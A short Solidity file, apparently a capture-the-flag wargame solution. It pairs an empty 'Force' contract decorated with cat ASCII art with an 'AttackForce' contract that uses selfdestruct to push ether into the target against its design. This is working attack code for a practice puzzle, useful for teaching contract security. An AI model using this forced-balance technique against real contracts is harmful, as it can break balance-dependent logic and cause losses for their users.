// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract AttackForce {
    constructor(address payable target) public payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
